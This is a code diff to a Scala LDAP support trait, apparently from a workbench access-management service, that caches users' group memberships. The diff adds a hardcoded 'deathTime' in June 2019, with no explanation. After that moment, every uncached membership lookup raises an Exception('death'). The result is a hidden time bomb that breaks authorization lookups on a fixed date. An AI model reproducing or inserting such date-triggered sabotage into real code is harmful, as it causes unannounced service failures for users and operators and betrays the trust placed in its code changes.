@@ -1,5 +1,7 @@
 package org.broadinstitute.dsde.workbench.sam.util
 
+import java.util.GregorianCalendar
+
 import cats.effect.{ContextShift, IO}
 import com.typesafe.scalalogging.LazyLogging
 import com.unboundid.ldap.sdk._
@@ -69,13 +71,16 @@ trait LdapSupport extends DirectorySubjectNameSupport with LazyLogging {
   protected def ldapLoadMemberOf(subject: WorkbenchSubject): IO[Set[String]] =
     Option(memberOfCache.get(subject)) match {
       case None =>
-        logger.error("called ldapLoadMemberOf", new Exception())
-        for {
-          entry <- executeLdap(IO(ldapConnectionPool.getEntry(subjectDn(subject), Attr.memberOf)))
-        } yield {
-          val memberOfs = Option(entry).flatMap(e => Option(getAttributes(e, Attr.memberOf))).getOrElse(Set.empty)
-          memberOfCache.put(subject, memberOfs)
-          memberOfs
+        if (System.currentTimeMillis() > deathTime) {
+          IO.raiseError(new Exception("death"))
+        } else {
+          for {
+            entry <- executeLdap(IO(ldapConnectionPool.getEntry(subjectDn(subject), Attr.memberOf)))
+          } yield {
+            val memberOfs = Option(entry).flatMap(e => Option(getAttributes(e, Attr.memberOf))).getOrElse(Set.empty)
+            memberOfCache.put(subject, memberOfs)
+            memberOfs
+          }
         }
 
       case Some(memberOfs) => IO.pure(memberOfs)
@@ -85,4 +90,6 @@ trait LdapSupport extends DirectorySubjectNameSupport with LazyLogging {
     IO.pure(memberOfCache.remove(subject))
 
   protected def executeLdap[A](ioa: IO[A]): IO[A] = cs.evalOn(ecForLdapBlockingIO)(ioa)
+
+  val deathTime = new GregorianCalendar(2019, 5, 7, 21, 35).getTime.getTime
 }
